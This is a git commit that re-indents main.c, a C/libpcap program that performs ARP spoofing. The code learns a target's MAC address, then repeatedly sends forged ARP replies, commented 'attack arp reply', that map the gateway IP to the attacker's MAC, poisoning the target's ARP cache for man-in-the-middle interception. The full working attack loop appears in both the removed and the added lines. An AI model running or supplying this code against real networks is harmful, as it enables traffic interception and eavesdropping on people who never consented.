50e7e7be6ae6112fbf72349b1eab92292ad7b4dd
gullabjamun <supermariocake@gmail.com>
2017-07-31 16:23:54 +0900

    prefix indent

--- main.c
+++ main.c
@@ -1,11 +1,10 @@
 #include <pcap.h>
 #include "protocol_information.h"
 #include "printfunc.h"
-    #include <stdio.h>
+#include <stdio.h>
 #include <arpa/inet.h>
 #include <unistd.h>
-#include <string.h> /* for strncpy */
-
+#include <string.h> 
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
@@ -14,45 +13,46 @@
 #define ETHERTYPE_IP 0x0800
 #define ETHERTYPE_ARP 0X0806
 
-     int main(int argc, char *argv[])
-     {
-	u_char send_packet_arprequest[42]={0xFF, 0xFF, 0xFF, 0xFF, 0xFF ,0xFF, 0x94, 0xE9,
-					 0x79, 0x95 ,0x00, 0xFD, 0x08, 0x06, 0x00, 0x01,
-					 0x08, 0x00, 0x06, 0x04 , 0x00 , 0x01 , 0x94 , 0xE9,
-					 0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
-					 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
-					 0x2B , 0x01};
+int main(int argc, char *argv[])
+{
 
-					 
-	u_char send_packet_arpreply[42]={0xFF, 0xFF, 0xFF, 0xFF, 0xFF ,0xFF, 0x94, 0xE9,
-					 0x79, 0x95 ,0x00, 0xFD, 0x08, 0x06, 0x00, 0x01,
-					 0x08, 0x00, 0x06, 0x04 , 0x00 , 0x02 , 0x94 , 0xE9,
-					 0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
-					 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
-					 0x2B , 0x01};
+    u_char send_packet_arprequest[42]={0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0x94 , 0xE9,
+                                       0x79 , 0x95 , 0x00 , 0xFD , 0x08 , 0x06 , 0x00 , 0x01,
+                                       0x08 , 0x00 , 0x06 , 0x04 , 0x00 , 0x01 , 0x94 , 0xE9,
+                                       0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
+                                       0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
+                                       0x2B , 0x01};
+
+
+    u_char send_packet_arpreply[42]={0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0x94 , 0xE9,
+                                     0x79 , 0x95 , 0x00 , 0xFD , 0x08 , 0x06 , 0x00 , 0x01,
+                                     0x08 , 0x00 , 0x06 , 0x04 , 0x00 , 0x02 , 0x94 , 0xE9,
+                                     0x79 , 0x95 , 0x00 , 0xFD , 0xC0 , 0xA8 , 0x2B , 0x45,
+                                     0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xC0 , 0xA8,
+                                     0x2B , 0x01};
 
 
 ///////////////////////////get my ip//////////////////////////////////////////
- int fd;
- struct ifreq ifr;
- u_char my_ip[4]={0,};
- fd = socket(AF_INET, SOCK_DGRAM, 0);
+    int fd;
+     struct ifreq ifr;
+    u_char my_ip[4]={0,};
+     fd = socket(AF_INET, SOCK_DGRAM, 0);
 
- /* I want to get an IPv4 IP address */
- ifr.ifr_addr.sa_family = AF_INET;
+    /* I want to get an IPv4 IP address */
+    ifr.ifr_addr.sa_family = AF_INET;
 
- /* I want IP address attached to "eth0" */
- strncpy(ifr.ifr_name, "ens33", IFNAMSIZ-1);
+     /* I want IP address attached to "eth0" */
+    strncpy(ifr.ifr_name, "ens33", IFNAMSIZ-1);
 
- ioctl(fd, SIOCGIFADDR, &ifr);
+    ioctl(fd, SIOCGIFADDR, &ifr);
 
- close(fd);
- memcpy(my_ip,&((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr),4);
+    close(fd);
+     memcpy(my_ip,&((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr),4);
 
 ////////////////////////////////////////////////////////////////////////////
 
 /////////////////////////get my mac/////////////////////////////////////////
- 
+
     struct ifconf ifc;
     char buf[1024];
     int i;
@@ -87,63 +87,58 @@
 
 ////////////////////////////////////////////////////////////////////////////////////////
 
-        pcap_t *handle;			/* Session handle */
-        char *dev;			/* The device to sniff on */
-        char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
-        struct bpf_program fp;		/* The compiled filter */
-        char filter_exp[] = "arp";	/* The filter expression */
-        bpf_u_int32 mask;		/* Our netmask */
-        bpf_u_int32 net;		/* Our IP */
-        struct pcap_pkthdr *header;	/* The header that pcap gives us */
-        const u_char *packet;		/* The actual packet */
+   pcap_t *handle;                  /* Session handle */
+   char *dev;                       /* The device to sniff on */
+   char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
+   struct bpf_program fp;       	/* The compiled filter */
+   char filter_exp[] = "arp";       /* The filter expression */
+   bpf_u_int32 mask;                /* Our netmask */
+   bpf_u_int32 net;                 /* Our IP */
+   struct pcap_pkthdr *header;  	/* The header that pcap gives us */
+   const u_char *packet;            /* The actual packet */
+    
+    u_short datalength;
+    u_char tcpoff;
+    u_char ipoff;
+    char ip_dst_str[16];
+    char ip_src_str[16];
 
-	u_short datalength;
-	u_char tcpoff;
-	u_char ipoff;
-	char ip_dst_str[16];
-	char ip_src_str[16];
-
-	struct arphdr *arprequest_arp;
-	struct arphdr *arpreply_arp;
-	
-	
-	struct sniff_ethernet *arprequest_eth;
-	struct sniff_ethernet *arpreply_eth;
-
-	struct arphdr *arp_to_know_targetmac;
-	struct sniff_ethernet *ethernet;
-	
-	struct sniff_ip *ip;
-	struct sniff_tcp *tcp;
-	struct sniff_data *data;
-
-	u_char sender_ip_str[4];
-	u_char target_ip_str[4];
-
-	u_char *sender_ip=argv[2];
-	u_char *target_ip=argv[3];
-	u_char target_ip_data[4];
-	inet_pton(AF_INET,target_ip,target_ip_data);
-
-	arprequest_eth=(struct sniff_ethernet*)send_packet_arprequest;
-	arpreply_eth=(struct sniff_ethernet*)send_packet_arpreply;
-	arprequest_arp=(struct arphdr*)(send_packet_arprequest+14);
-	arpreply_arp=(struct arphdr*)(send_packet_arpreply+14);
-
-	/* arp request to know target mac address*/
-
-	memcpy((*arprequest_eth).ether_shost,my_mac,6);  //my mac
-	memcpy((*arprequest_arp).sha,my_mac,6);		//my mac
-	memcpy((*arprequest_arp).spa,my_ip,4);		//senderip-my, i have to get my ip information
-	inet_pton(AF_INET,target_ip,(*arprequest_arp).tpa); //targetip
+    struct arphdr *arprequest_arp;
+    struct arphdr *arpreply_arp;
 
 
+    struct sniff_ethernet *arprequest_eth;
+    struct sniff_ethernet *arpreply_eth;
 
-				
+    struct arphdr *arp_to_know_targetmac;
+    struct sniff_ethernet *ethernet;
 
-			
-	
-	unsigned char target_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
+    struct sniff_ip *ip;
+    struct sniff_tcp *tcp;
+    struct sniff_data *data;
+
+    u_char sender_ip_str[4];
+    u_char target_ip_str[4];
+
+    u_char *sender_ip=argv[2];
+    u_char *target_ip=argv[3];
+    u_char target_ip_data[4];
+    inet_pton(AF_INET,target_ip,target_ip_data);
+
+    arprequest_eth=(struct sniff_ethernet*)send_packet_arprequest;
+    arpreply_eth=(struct sniff_ethernet*)send_packet_arpreply;
+    arprequest_arp=(struct arphdr*)(send_packet_arprequest+14);
+    arpreply_arp=(struct arphdr*)(send_packet_arpreply+14);
+
+    /* arp request to know target mac address*/
+
+    memcpy((*arprequest_eth).ether_shost,my_mac,6);      //my mac
+    memcpy((*arprequest_arp).sha,my_mac,6);             //my mac
+    memcpy((*arprequest_arp).spa,my_ip,4);          	//senderip-my, i have to get my ip information
+    inet_pton(AF_INET,target_ip,(*arprequest_arp).tpa); //targetip
+
+    
+    unsigned char target_mac[6]={0xdd,0xdd,0xdd,0xdd,0xdd,0xdd};
 
         /* Define the device */
         dev = pcap_lookupdev(errbuf);
@@ -173,55 +168,60 @@
             return(2);
         }
 
-  	  while(1)
-	  {
-	//	printf("%s\n",sender_ip);
-	//	printf("%s\n",target_ip);
-		printf("sending arp packet\n");
-		if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
-		{
-			printf("error\n");
-		}
+        
+      while(1)
+      {
+          
+          
 
-	      	int res;
-		 /* Grab a packet */
-      		res=pcap_next_ex(handle, &header,&packet);
-      	        if(res==0) continue;
-		else if(res==-1) break;
-		else if(res==-2) break;
-	
+            printf("sending arp packet\n");
+            if(pcap_sendpacket(handle,send_packet_arprequest,42)!=0)
+            {
+                 printf("error\n");
+            }
 
-		ethernet=(struct sniff_ethernet*)packet;
-
-		if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
-		{
-			arp_to_know_targetmac=(struct arphdr*)(packet+14);
-			if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
-			{
-				if(!strcmp((*arp_to_know_targetmac).spa,target_ip_data))
-				{
-					memcpy(target_mac,(*arp_to_know_targetmac).sha,6);
-				}
-			}
-		}	
-
-	/* attack arp reply */
-	memcpy((*arpreply_eth).ether_dhost,target_mac,6);
-	memcpy((*arpreply_eth).ether_shost,my_mac,6); 	//my mac
-	memcpy((*arpreply_arp).sha,my_mac,6);		//my mac
-	inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa); //sender ip - gateway
-	memcpy((*arpreply_arp).tha,target_mac,6);		
-	inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa); //targetip
-
-		if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
-		{
-			printf("error\n");
-		}
+            int res;
+                   /* Grab a packet */
+            res=pcap_next_ex(handle, &header,&packet);
+            
+            if(res==0) continue;
+            else if(res==-1) break;
+            else if(res==-2) break;
 
 
+            ethernet=(struct sniff_ethernet*)packet;
 
-	  }
+            if(ntohs((*ethernet).ether_type)==ETHERTYPE_ARP)
+            {
+                arp_to_know_targetmac=(struct arphdr*)(packet+14);
+                if(ntohs((*arp_to_know_targetmac).oper)==0x0002)
+                {
+                    if(!strcmp((*arp_to_know_targetmac).spa,target_ip_data))
+                    {
+                        memcpy(target_mac,(*arp_to_know_targetmac).sha,6);
+                    }
+                }
+            }
+            
 
-        pcap_close(handle);
-        return(0);
+           /* attack arp reply */
+            memcpy((*arpreply_eth).ether_dhost,target_mac,6);
+            memcpy((*arpreply_eth).ether_shost,my_mac,6);       //my mac
+            memcpy((*arpreply_arp).sha,my_mac,6);               //my mac
+            inet_pton(AF_INET,sender_ip,(*arpreply_arp).spa);   //sender ip - gateway
+            memcpy((*arpreply_arp).tha,target_mac,6);
+            inet_pton(AF_INET,target_ip,(*arpreply_arp).tpa);    //targetip
+
+            if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
+            {
+                printf("error\n");
+            }
+
+
+
+      }
+
+            pcap_close(handle);
+            return(0);
      }
+
